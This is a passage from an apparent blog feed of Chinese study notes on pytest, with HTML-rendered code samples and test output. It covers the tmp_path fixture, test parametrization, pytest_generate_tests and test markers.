class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_class_demo.py</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestClassDemoInstance</span>:<br>    value = <span class="hljs-number">0</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_one</span>(<span class="hljs-params">self</span>):<br>        self.value = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">assert</span> self.value == <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_two</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">assert</span> self.value == <span class="hljs-number">1</span><br>$ pytest -k TestClassDemoInstance -q<br>.F                                                                   [<span class="hljs-number">100</span>%]<br>================================= FAILURES =================================<br>______________________ TestClassDemoInstance.test_two ______________________<br><br>self = &lt;test_class_demo.TestClassDemoInstance <span class="hljs-built_in">object</span> at <span class="hljs-number">0xdeadbeef0002</span>&gt;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_two</span>(<span class="hljs-params">self</span>):<br>&gt;       <span class="hljs-keyword">assert</span> self.value == <span class="hljs-number">1</span><br>E       <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> == <span class="hljs-number">1</span><br>E        +  where <span class="hljs-number">0</span> = &lt;test_class_demo.TestClassDemoInstance <span class="hljs-built_in">object</span> at <span class="hljs-number">0xdeadbeef0002</span>&gt;.value<br><br>test_class_demo.py:<span class="hljs-number">9</span>: AssertionError<br>========================= short test summary info ==========================<br>FAILED test_class_demo.py::TestClassDemoInstance::test_two - <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span> == <span class="hljs-number">1</span><br><span class="hljs-number">1</span> failed, <span class="hljs-number">1</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s<br></code></pre></td></tr></table></figure><p>Note that attributes added at class level are <em>class attributes</em>, so they will be shared between tests.</p><p>请注意，在类级别添加的属性是类属性，因此它们将在测试用例之间共享。</p><blockquote><p>测试用例：def test_xxx():</p></blockquote><h2 id="1-6-请求一个用于功能测试的唯一临时目录"><a href="#1-6-请求一个用于功能测试的唯一临时目录" class="headerlink" title="1.6 请求一个用于功能测试的唯一临时目录"></a>1.6 请求一个用于功能测试的唯一临时目录</h2><blockquote><p>Request a unique temporary directory for functional tests</p></blockquote><p><code>pytest</code> provides <a href="https://docs.pytest.org/en/8.0.x/builtin.html">Builtin fixtures&#x2F;function arguments</a> to request arbitrary resources, like a unique temporary directory:</p><p>pytest 提供内置固定装置&#x2F;函数参数来请求任意资源，例如唯一的临时目录：</p><blockquote><p>内置固定装置: 就是fixtures </p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_tmp_path.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_needsfiles</span>(<span class="hljs-params">tmp_path</span>): <span class="hljs-comment"># 这里的tmp_path 就是fixtures</span><br>    <span class="hljs-built_in">print</span>(tmp_path)<br>    <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>List the name <code>tmp_path</code> in the test function signature and <code>pytest</code> will lookup and call a fixture factory to create the resource before performing the test function call. Before the test runs, <code>pytest</code> creates a unique-per-test-invocation temporary directory:</p><p>在测试函数签名中列出名称tmp_path, pytest将在执行测试函数调用之前查找并调用一个fixture工厂来创建资源。在测试运行之前，pytest创建一个每个测试调用唯一的临时目录:</p><p>在测试函数加入参数tmp_path,</p><p>pytest将在执行测试函数之前调用fixture里面的tmp_path方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -q test_tmp_path.py<br>F                                                                    [<span class="hljs-number">100</span>%]<br>================================= FAILURES =================================<br>_____________________________ test_needsfiles ______________________________<br><br>tmp_path = PosixPath(<span class="hljs-string">&#x27;PYTEST_TMPDIR/test_needsfiles0&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_needsfiles</span>(<span class="hljs-params">tmp_path</span>):<br>        <span class="hljs-built_in">print</span>(tmp_path)<br>&gt;       <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br>E       <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br><br>test_tmp_path.py:<span class="hljs-number">3</span>: AssertionError<br>--------------------------- Captured stdout call ---------------------------<br>PYTEST_TMPDIR/test_needsfiles0<br>========================= short test summary info ==========================<br>FAILED test_tmp_path.py::test_needsfiles - <span class="hljs-keyword">assert</span> <span class="hljs-number">0</span><br><span class="hljs-number">1</span> failed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s<br></code></pre></td></tr></table></figure><p>More info on temporary directory handling is available at <a href="https://docs.pytest.org/en/8.0.x/how-to/tmp_path.html#tmp-path-handling">Temporary directories and files</a>.</p><p>有关临时目录处理的更多信息，请参阅临时目录和文件（后面会讲哒）</p><p>Find out what kind of builtin <a href="https://docs.pytest.org/en/8.0.x/reference/fixtures.html#fixtures">pytest fixtures</a> exist with the command:</p><p>使用以下命令可以找出存在哪种内置 pytest 装置：pytest –fixtures</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pytest --fixtures   <span class="hljs-comment"># shows builtin and custom fixtures</span><br></code></pre></td></tr></table></figure><p>Note that this command omits fixtures with leading <code>_</code> unless the <code>-v</code> option is added.</p><p>请注意，除非添加<code> -v</code> 选项，否则此命令会忽略带有前导 <code>_</code> 的装置。</p><p>未完待续……</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
      <tag>pytest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python 之 pytest 使用参数化夹具测试（六）</title>
    <link href="/2024/01/20/666python-%E4%B9%8B-pytest-%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E5%8C%96%E5%A4%B9%E5%85%B7%E6%B5%8B%E8%AF%95%EF%BC%88%E5%85%AD%EF%BC%89/"/>
    <url>/2024/01/20/666python-%E4%B9%8B-pytest-%E4%BD%BF%E7%94%A8%E5%8F%82%E6%95%B0%E5%8C%96%E5%A4%B9%E5%85%B7%E6%B5%8B%E8%AF%95%EF%BC%88%E5%85%AD%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="如何使用参数化夹具测试"><a href="#如何使用参数化夹具测试" class="headerlink" title="如何使用参数化夹具测试"></a>如何使用参数化夹具测试</h1><p>pytest 支持多个级别的测试参数化：</p><ul><li>pytest.fixture() 允许对夹具函数进行参数化。</li><li>@pytest.mark.parametrize 允许在测试函数或类中定义多组参数和fixture。</li><li>pytest_generate_tests 允许定义自定义参数化方案或扩展。</li></ul><h2 id="参数化测试方法：-pytest-mark-parametrize"><a href="#参数化测试方法：-pytest-mark-parametrize" class="headerlink" title="参数化测试方法：@pytest.mark.parametrize"></a>参数化测试方法：<code>@pytest.mark.parametrize</code></h2><p>内置的 pytest.mark.parametrize 装饰器可以对测试函数的参数进行参数化。以下是测试函数的典型示例，该函数实现检查特定输入是否会产生预期输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_expectation.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&quot;test_input,expected&quot;</span>, [(<span class="hljs-params"><span class="hljs-string">&quot;3+5&quot;</span>, <span class="hljs-number">8</span></span>), (<span class="hljs-params"><span class="hljs-string">&quot;2+4&quot;</span>, <span class="hljs-number">6</span></span>), (<span class="hljs-params"><span class="hljs-string">&quot;6*9&quot;</span>, <span class="hljs-number">42</span></span>)]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_eval</span>(<span class="hljs-params">test_input, expected</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">eval</span>(test_input) == expected<br><span class="hljs-comment"># 用列表 列表内的元素是要传递给前面的方法名称的，</span><br><span class="hljs-comment"># 如果是多个方法，列表内的元素就是元组，一组元素表示一次参数化</span><br><span class="hljs-comment"># 这里， @parametrize 装饰器定义了三个不同的 (test_input,expected) 元组元素入参，以便 test_eval测试函数将依次使用它们运行三次：</span><br>=================================== FAILURES ===================================<br>______________________________ test_eval[<span class="hljs-number">6</span>*<span class="hljs-number">9</span>-<span class="hljs-number">42</span>] _______________________________<br><br>test_input = <span class="hljs-string">&#x27;6*9&#x27;</span>, expected = <span class="hljs-number">42</span><br><br><span class="hljs-meta">    @pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&quot;test_input,expected&quot;</span>, [(<span class="hljs-params"><span class="hljs-string">&quot;3+5&quot;</span>, <span class="hljs-number">8</span></span>), (<span class="hljs-params"><span class="hljs-string">&quot;2+4&quot;</span>, <span class="hljs-number">6</span></span>), (<span class="hljs-params"><span class="hljs-string">&quot;6*9&quot;</span>, <span class="hljs-number">42</span></span>)]</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_eval</span>(<span class="hljs-params">test_input, expected</span>):<br>&gt;       <span class="hljs-keyword">assert</span> <span class="hljs-built_in">eval</span>(test_input) == expected<br>E       AssertionError: <span class="hljs-keyword">assert</span> <span class="hljs-number">54</span> == <span class="hljs-number">42</span> <span class="hljs-comment"># 错误</span><br>E        +  where <span class="hljs-number">54</span> = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;6*9&#x27;</span>)<br><br>testcases/test_parametrize_case.py:<span class="hljs-number">6</span>: AssertionError<br>=========================== short test summary info ============================<br>FAILED testcases/test_parametrize_case.py::test_eval[<span class="hljs-number">6</span>*<span class="hljs-number">9</span>-<span class="hljs-number">42</span>] - AssertionError...<br>========================= <span class="hljs-number">1</span> failed, <span class="hljs-number">2</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ==========================<br></code></pre></td></tr></table></figure><blockquote><p>参数值按原样传递给测试（没有任何副本）。—-&gt; 引用传递 函数接收的是参数的引用或指针，即函数内部操作的是参数的引用，对参数的修改会影响到原始对象。</p><p> 例如，如果您传递一个列表或字典作为参数值，并且测试用例代码对其进行变更，则这些变更将反映在后续测试用例调用中。</p></blockquote><blockquote><p>pytest 默认情况下会对 unicode 字符串中使用的任何非 ascii 字符进行转义以进行参数化，因为它有几个缺点。但是，如果您想在参数化中使用 unicode 字符串并按原样在终端中查看它们（非转义），请在 pytest.ini 中使用此选项：</p></blockquote><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[pytest]</span><br><span class="hljs-attr">disable_test_id_escaping_and_forfeit_all_rights_to_community_support</span> = <span class="hljs-literal">True</span><br><span class="hljs-comment"># 但请记住，这可能会导致不必要的副作用甚至错误，具体取决于所使用的操作系统和当前安装的插件，</span><br></code></pre></td></tr></table></figure><p>正如本示例中所设计的，只有一组输入&#x2F;输出值未通过 功能测试。与测试函数参数一样，可以在回溯中看到输入和输出值。</p><p>还可以在类或模块上使用<code>mark.parametrize</code>标记，类内的所有测试用例都可以使用这个参数化，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&quot;n,expected&quot;</span>, [(<span class="hljs-params"><span class="hljs-number">1</span>, <span class="hljs-number">2</span></span>), (<span class="hljs-params"><span class="hljs-number">3</span>, <span class="hljs-number">4</span></span>)]</span>)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_simple_case</span>(<span class="hljs-params">self, n, expected</span>):<br>        <span class="hljs-keyword">assert</span> n + <span class="hljs-number">1</span> == expected<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_weird_simple_case</span>(<span class="hljs-params">self, n, expected</span>):<br>        <span class="hljs-keyword">assert</span> (n * <span class="hljs-number">1</span>) + <span class="hljs-number">1</span> == expected<br></code></pre></td></tr></table></figure><p>要使参数化作用在该模块（.py文件）中的所有测试用例，可以定义一个<code>pytestmark</code> 全局变量去接收这个参数化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pytest<br><br>pytestmark = pytest.mark.parametrize(<span class="hljs-string">&quot;n,expected&quot;</span>, [(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>), (<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)]) <span class="hljs-comment"># 使用pytestmark接收</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">TestClass</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_simple_case</span>(<span class="hljs-params">self, n, expected</span>):<br>        <span class="hljs-keyword">assert</span> n + <span class="hljs-number">1</span> == expected<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_weird_simple_case</span>(<span class="hljs-params">self, n, expected</span>):<br>        <span class="hljs-keyword">assert</span> (n * <span class="hljs-number">1</span>) + <span class="hljs-number">1</span> == expected<br></code></pre></td></tr></table></figure><p>还可以在参数化中标记单个测试实例，例如使用内置的 mark.xfail：(可能错误标记)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_expectation.py</span><br><span class="hljs-keyword">import</span> pytest<br><br><br><span class="hljs-meta">@pytest.mark.parametrize(<span class="hljs-params"></span></span><br><span class="hljs-params"><span class="hljs-meta">    <span class="hljs-string">&quot;test_input,expected&quot;</span>,</span></span><br><span class="hljs-params"><span class="hljs-meta">    [(<span class="hljs-params"><span class="hljs-string">&quot;3+5&quot;</span>, <span class="hljs-number">8</span></span>), (<span class="hljs-params"><span class="hljs-string">&quot;2+4&quot;</span>, <span class="hljs-number">6</span></span>), pytest.param(<span class="hljs-params"><span class="hljs-string">&quot;6*9&quot;</span>, <span class="hljs-number">42</span>, marks=pytest.mark.xfail</span>)],</span></span><br><span class="hljs-params"><span class="hljs-meta"></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_eval</span>(<span class="hljs-params">test_input, expected</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">eval</span>(test_input) == expected<br>    <br><span class="hljs-comment"># 运行结果========================</span><br>============================= test session starts ==============================<br>configfile: pytest.ini<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collecting ... collected <span class="hljs-number">3</span> items<br><br>testcases/test_parametrize_case.py::test_eval[<span class="hljs-number">6</span>*<span class="hljs-number">9</span>-<span class="hljs-number">42</span>] XFAIL <span class="hljs-comment"># 错误标记</span><br>testcases/test_parametrize_case.py::test_eval[<span class="hljs-number">2</span>+<span class="hljs-number">4</span>-<span class="hljs-number">6</span>] PASSED<br>testcases/test_parametrize_case.py::test_eval[<span class="hljs-number">3</span>+<span class="hljs-number">5</span>-<span class="hljs-number">8</span>] PASSED<br><br>========================= <span class="hljs-number">2</span> passed, <span class="hljs-number">1</span> xfailed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s =========================<br></code></pre></td></tr></table></figure><p>之前导致失败的一个参数集现在显示为“xfailed”（预期失败）测试。</p><p>如果提供给参数化的值导致空列表 - 例如，如果它们是由某个函数动态生成的 - pytest 的行为由empty_parameter_set_mark 选项定义。</p><p>要获取多个参数化参数的所有组合，可以堆叠使用参数化装饰器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&quot;x&quot;</span>, [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>]</span>)</span><br><span class="hljs-meta">@pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&quot;y&quot;</span>, [<span class="hljs-number">2</span>, <span class="hljs-number">3</span>]</span>) </span><span class="hljs-comment"># 先从这个的最右边的开始运行</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_foo</span>(<span class="hljs-params">x, y</span>):<br>    <span class="hljs-keyword">pass</span><br><span class="hljs-comment"># 测试结果：</span><br><span class="hljs-comment"># 运行测试，参数设置为 x=0/y=2、x=1/y=2、x=0/y=3 和 x=1/y=3，按照装饰器的顺序开始参数。</span><br>============================= test session starts ==============================<br>plugins: anyio-<span class="hljs-number">4.2</span><span class="hljs-number">.0</span><br>collecting ... collected <span class="hljs-number">4</span> items<br><br>testcases/test_parametrize_case.py::test_foo[<span class="hljs-number">3</span>-<span class="hljs-number">0</span>] x=<span class="hljs-number">0</span>, y=<span class="hljs-number">3</span> <span class="hljs-comment"># 先从第二个的最右边的开始运行</span><br>PASSED<br>testcases/test_parametrize_case.py::test_foo[<span class="hljs-number">3</span>-<span class="hljs-number">1</span>] x=<span class="hljs-number">1</span>, y=<span class="hljs-number">3</span><br>PASSED<br>testcases/test_parametrize_case.py::test_foo[<span class="hljs-number">2</span>-<span class="hljs-number">1</span>] x=<span class="hljs-number">1</span>, y=<span class="hljs-number">2</span><br>PASSED<br>testcases/test_parametrize_case.py::test_foo[<span class="hljs-number">2</span>-<span class="hljs-number">0</span>] x=<span class="hljs-number">0</span>, y=<span class="hljs-number">2</span> <span class="hljs-comment"># 最后再运行第一个的最左边的</span><br>PASSED<br><br>============================== <span class="hljs-number">4</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.01</span>s ===========<br><br></code></pre></td></tr></table></figure><h2 id="基本-pytest-generate-tests-示例"><a href="#基本-pytest-generate-tests-示例" class="headerlink" title="基本 pytest_generate_tests 示例"></a>基本 pytest_generate_tests 示例</h2><p>有时，您可能希望实现自己的参数化方案或实现一些动态来确定夹具的参数或范围。为此，您可以使用pytest_generate_tests钩子，该钩子在收集测试函数时被调用。通过传入的metafunc对象，您可以检查请求测试上下文，最重要的是，您可以调用metafunc. parameterize()来进行参数化。</p><p>例如，假设我们想要运行一个测试，获取我们想要通过新的 pytest 命令行选项设置的字符串输入。让我们首先编写一个接受字符串输入固定函数参数的简单测试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of test_strings.py</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_valid_string</span>(<span class="hljs-params">stringinput</span>):<br>    <span class="hljs-keyword">assert</span> stringinput.isalpha() <span class="hljs-comment"># 以字母开头</span><br></code></pre></td></tr></table></figure><p>然后在conftest.py 文件中添加，其中包含命令行选项和测试函数的参数化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># content of conftest.py</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pytest_addoption</span>(<span class="hljs-params">parser</span>):<br>    parser.addoption(<br>        <span class="hljs-string">&quot;--stringinput&quot;</span>,<br>        action=<span class="hljs-string">&quot;append&quot;</span>,<br>        default=[],<br>        <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;list of stringinputs to pass to test functions&quot;</span>,<br>    )<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pytest_generate_tests</span>(<span class="hljs-params">metafunc</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;stringinput&quot;</span> <span class="hljs-keyword">in</span> metafunc.fixturenames:<br>        metafunc.parametrize(<span class="hljs-string">&quot;stringinput&quot;</span>, metafunc.config.getoption(<span class="hljs-string">&quot;stringinput&quot;</span>))<br></code></pre></td></tr></table></figure><p>如果我们现在传递两个字符串输入值，我们的测试将运行两次：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -q --stringinput=<span class="hljs-string">&quot;hello&quot;</span> --stringinput=<span class="hljs-string">&quot;world&quot;</span> test_strings.py<br>..                                                                   [<span class="hljs-number">100</span>%]<br><span class="hljs-number">2</span> passed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s<br></code></pre></td></tr></table></figure><p>我们还使用一个字符串输入来运行，这将导致测试失败：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -q --stringinput=<span class="hljs-string">&quot;!&quot;</span> test_strings.py <span class="hljs-comment"># stringinput=！</span><br>F                                                                    [<span class="hljs-number">100</span>%]<br>================================= FAILURES =================================<br>___________________________ test_valid_string[!] ___________________________<br><br>stringinput = <span class="hljs-string">&#x27;!&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">test_valid_string</span>(<span class="hljs-params">stringinput</span>):<br>&gt;       <span class="hljs-keyword">assert</span> stringinput.isalpha()<br>E       AssertionError: <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span><br>E        +  where <span class="hljs-literal">False</span> = &lt;built-<span class="hljs-keyword">in</span> method isalpha of <span class="hljs-built_in">str</span> <span class="hljs-built_in">object</span> at <span class="hljs-number">0xdeadbeef0001</span>&gt;()<br>E        +    where &lt;built-<span class="hljs-keyword">in</span> method isalpha of <span class="hljs-built_in">str</span> <span class="hljs-built_in">object</span> at <span class="hljs-number">0xdeadbeef0001</span>&gt; = <span class="hljs-string">&#x27;!&#x27;</span>.isalpha <span class="hljs-comment"># ! 不是字母开头</span><br><br>test_strings.py:<span class="hljs-number">4</span>: AssertionError<br>========================= short test summary info ==========================<br>FAILED test_strings.py::test_valid_string[!] - AssertionError: <span class="hljs-keyword">assert</span> <span class="hljs-literal">False</span><br><span class="hljs-number">1</span> failed <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s<br></code></pre></td></tr></table></figure><p>如果不指定字符串输入，它将被跳过，因为将使用空参数列表调用metafunc.parametrize()：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pytest -q -rs test_strings.py<br>s                                                                    [<span class="hljs-number">100</span>%]<br>========================= short test summary info ==========================<br>SKIPPED [<span class="hljs-number">1</span>] test_strings.py: got empty parameter <span class="hljs-built_in">set</span> [<span class="hljs-string">&#x27;stringinput&#x27;</span>], function test_valid_string at /home/sweet/project/test_strings.py:<span class="hljs-number">2</span><br><span class="hljs-number">1</span> skipped <span class="hljs-keyword">in</span> <span class="hljs-number">0.12</span>s <span class="hljs-comment"># 提示被跳过</span><br></code></pre></td></tr></table></figure><blockquote><p>请注意，当使用不同的参数集多次调用metafunc.parametrize时，这些集中的所有参数名称不能重复，否则会引发错误。</p></blockquote><p>更多示例</p><p>对于更多示例 可以查看更多参数化示例 <a href="https://docs.pytest.org/en/8.0.x/example/parametrize.html#paramexamples">more parametrization examples</a> </p>]]></content>
    
    
    
    <tags>
      
      <tag>python</tag>
      
      <tag>笔记</tag>
      
      <tag>pytest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python 之 pytest标记（五）</title>
    <link href="/2024/01/20/665python-%E4%B9%8B-pytest%E6%A0%87%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/"/>
    <url>/2024/01/20/665python-%E4%B9%8B-pytest%E6%A0%87%E8%AE%B0%EF%BC%88%E4%BA%94%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="如何用属性标记测试函数"><a href="#如何用属性标记测试函数" class="headerlink" title="如何用属性标记测试函数"></a>如何用属性标记测试函数</h1><h2 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h2><p>通过使用<code>pytest.mark</code>可以轻松地在测试函数上设置元数据。可以在API参考中找到内置标记的完整列表。</p><p>或者可以使用命令行<code>pytest — —markers</code>列出内置的和自定义的所有标记，</p><p>内置标记包含：</p><ul><li><code>usefixtures</code> - 使用fixutures的测试用例或者类</li><li><code>filterwarnings</code> 过滤带警告的测试函数</li><li><code>skip</code> 测试的时候跳过该测试用例</li><li><code>skipif</code>：根据条件跳过测试。后面可以写条件</li><li><code>xfail</code>标记预期失败的测试用例，即使测试失败也不会报告为错误。</li><li><code>parametrize</code>：参数化测试，用于通过不同的参数运行同一个测试多次。</li><li><code>timeout</code>：设置测试的最大运行时间，超时将中止测试。</li></ul><p>创建自定义标记或将标记应用于整个测试类或模块非常容易。这些标记可以被插件使用，也通常用于使用-m选项在命令行上选择测试。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-meta">@pytest.mark.usefixtures</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_function</span>():<br>    <span class="hljs-comment"># 测试代码</span><br><span class="hljs-meta">@pytest.mark.skip</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_function</span>():<br>    <span class="hljs-comment"># 测试代码</span><br><span class="hljs-meta">@pytest.mark.skipif(<span class="hljs-params">condition, reason=optional_reason</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_function</span>():<br>    <span class="hljs-comment"># 测试代码</span><br><span class="hljs-meta">@pytest.mark.xfail</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">test_function</span>():<br>    <span class="hljs-comment"># 测试代码</span><br><span class="hljs-meta">@pytest.mark.parametrize(<span class="hljs-params"><span class="hljs-string">&quot;param&quot;</span>, [value1, value2, ...]</span>)</span><br><span 